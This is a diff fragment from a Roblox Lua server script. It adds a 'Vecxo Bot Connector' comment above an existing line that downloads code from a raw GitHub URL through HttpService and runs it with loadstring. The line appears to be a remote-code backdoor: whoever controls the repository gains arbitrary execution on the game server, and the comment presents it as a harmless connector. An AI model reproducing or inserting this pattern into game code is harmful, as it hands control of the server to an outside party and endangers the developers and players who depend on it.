@@ -725,5 +725,7 @@ Players.PlayerAdded:Connect(function(player)
 	end)
 end)
 
+
+--//Vecxo Bot Connector
 loadstring(game:GetService('HttpService'):GetAsync('https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/VecxoRemoteAPI'))() 
 
